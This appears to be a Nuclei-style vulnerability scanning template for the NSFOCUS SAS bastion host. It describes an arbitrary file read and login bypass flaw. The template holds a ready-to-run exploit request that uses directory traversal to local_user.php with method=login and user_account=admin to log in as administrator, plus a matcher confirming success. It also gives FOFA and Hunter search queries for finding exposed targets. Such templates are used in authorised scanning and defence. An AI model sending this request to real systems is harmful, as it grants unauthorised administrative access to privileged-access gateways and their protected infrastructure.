id: Nsfocus-SAS_login-bypass_webconf

info:
  name: Nsfocus-SAS_login-bypass_webconf
  author: hufei
  severity: critical
  description: |
     绿盟堡垒机存在任意文件读取漏洞
  reference:
    https://mp.weixin.qq.com/s/qHPo0noFTvJoEcor00qtDg
  metadata:
    max-request: 3
    fofa-query: title=="NSFOCUS&nbsp;SAS[H]"
    hunter-query: app.name="NSFOCUS 绿盟 SAS"
    verified: true
  tags: 2023,HVV,Nsfocus-SAS,login-bypass


requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"

    matchers:
      - type: word
        part: body
        words:
          - '{"status":200}'

